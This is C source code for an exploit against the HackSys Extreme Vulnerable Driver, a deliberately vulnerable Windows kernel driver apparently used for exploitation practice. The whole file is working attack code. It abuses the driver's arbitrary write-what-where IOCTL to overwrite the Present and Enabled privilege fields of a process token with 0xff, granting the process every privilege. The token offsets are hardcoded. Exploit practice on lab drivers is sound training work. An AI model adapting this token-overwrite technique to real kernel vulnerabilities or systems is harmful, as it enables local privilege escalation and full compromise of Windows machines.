#include "poptoke.h"

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

void
hacksys_so()
{
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\HackSysExtremeVulnerableDriver";
	HANDLE hHEVD;
	DWORD dwRetBytes = 0;
	PWRITE_WHAT_WHERE pww;
	BOOL bResult;
	char *what;

	HANDLE current_token;
	LPVOID _TOKEN;
	USHORT uToken;
	ULONG startTokenOffset, enabled_offset;

	printf("opening device handle...\n");

	// fetch device handle
	hHEVD = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hHEVD == INVALID_HANDLE_VALUE){
		printf("Failed to open handle: %08x\n", GetLastError());
		return;
	}

	// fetch process token
	if (!OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, 1, GetParentProcessId()), TOKEN_QUERY | TOKEN_QUERY_SOURCE, &current_token)){
		printf("[-] Failed to open current process token! %d\n", GetLastError());
		return;
	}

	// fetch token information
	uToken = (USHORT)current_token & 0xffff;
	_TOKEN = GetHandleAddress(GetCurrentProcessId(), uToken);
	printf("[+] Current token address: %08x\n", (USHORT)_TOKEN);

	startTokenOffset = (ULONG)_TOKEN + 0x40;
	enabled_offset = (ULONG)_TOKEN + 0x48;
	printf("[+] _SEP_TOKEN_PRIVILEGES Present at %08x\n", startTokenOffset);

	what = (char*)malloc(sizeof(PVOID));
	memset(what, 0xff, sizeof(PVOID));

	// 0x40
	pww = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE));
	pww->What = (PULONG_PTR)what;
	pww->Where = (PULONG_PTR)startTokenOffset; // present

	printf("[+] Triggering present (%08x)...\n", pww->Where);
	bResult = DeviceIoControl(hHEVD,
		//0x222003,
		0x22200B,
		(LPVOID)pww,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&dwRetBytes,
		NULL);

	// 0x48
	pww->Where = (PULONG_PTR)enabled_offset; // enabled
	printf("[+] Triggering enabled (%08x)...\n", pww->Where);
	bResult = DeviceIoControl(hHEVD,
		//0x222003,
		0x22200B,
		(LPVOID)pww,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&dwRetBytes,
		NULL);

	bResult = DeviceIoControl(hHEVD,
	//0x222003,
	0x22200B,
	(LPVOID)pww,
	sizeof(WRITE_WHAT_WHERE),
	NULL,
	0,
	&dwRetBytes,
	NULL);

	if (!bResult)
		printf("Failed %d (%d)\n", bResult, GetLastError());
	else
		printf("triggered\n");
}